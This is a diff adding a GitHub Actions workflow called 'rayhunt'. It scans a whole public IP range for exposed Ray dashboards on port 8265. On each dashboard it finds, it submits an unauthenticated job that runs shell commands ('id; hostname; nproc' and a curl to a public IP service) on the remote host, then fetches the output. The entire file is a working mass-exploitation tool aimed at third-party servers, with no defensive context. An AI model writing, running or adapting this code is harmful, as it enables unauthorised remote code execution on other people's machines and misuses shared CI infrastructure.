@@ -1,0 +1,77 @@
+name: rayhunt
+
+on:
+  workflow_dispatch:
+    inputs:
+      cidr:
+        description: CIDR
+        required: true
+        default: 5.9.0.0/16
+
+jobs:
+  hunt:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - uses: actions/checkout@v4
+      - name: ray
+        env:
+          CIDR: ${{ inputs.cidr }}
+        run: |
+          python3 -m pip install --quiet requests
+          python3 - <<'PY'
+          import asyncio
+          import ipaddress
+          import json
+          import os
+          import secrets
+          import time
+
+          import requests
+
+          CIDR = os.environ["CIDR"]
+          ips = [str(ip) for ip in ipaddress.ip_network(CIDR).hosts()]
+
+          async def probe(ip):
+              try:
+                  reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, 8265), 1.5)
+                  writer.close()
+                  return ip
+              except Exception:
+                  return None
+
+          async def run():
+              sem = asyncio.Semaphore(1200)
+              async def guarded(ip):
+                  async with sem:
+                      return await probe(ip)
+              return [ip for ip in await asyncio.gather(*(guarded(ip) for ip in ips)) if ip]
+
+          started = time.time()
+          open_ips = asyncio.run(run())
+          print(f"cidr={CIDR} scanned={len(ips)} open={len(open_ips)} secs={int(time.time()-started)}", flush=True)
+
+          for ip in open_ips:
+              try:
+                  r = requests.get(f"http://{ip}:8265/api/version", timeout=5)
+                  if r.status_code != 200 or '"version"' not in r.text:
+                      continue
+                  print("RAY", ip, r.text[:100], flush=True)
+                  sid = "lc" + secrets.token_hex(4)
+                  payload = {"entrypoint": "id; hostname; nproc; curl -s https://api.ipify.org",
+                             "submission_id": sid, "runtime_env": {}}
+                  job = requests.post(f"http://{ip}:8265/api/jobs/", json=payload, timeout=8)
+                  print(" submit", job.status_code, job.text[:160], flush=True)
+                  try:
+                      jid = job.json().get("job_id") or job.json().get("submission_id")
+                  except Exception:
+                      jid = None
+                  if not jid:
+                      continue
+                  time.sleep(4)
+                  for path in (f"/api/jobs/{jid}", f"/api/jobs/{jid}/logs"):
+                      out = requests.get(f"http://{ip}:8265{path}", timeout=8)
+                      print(" ", path, out.status_code, out.text[:300], flush=True)
+              except Exception as exc:
+                  print("ERR", ip, type(exc).__name__, flush=True)
+          PY
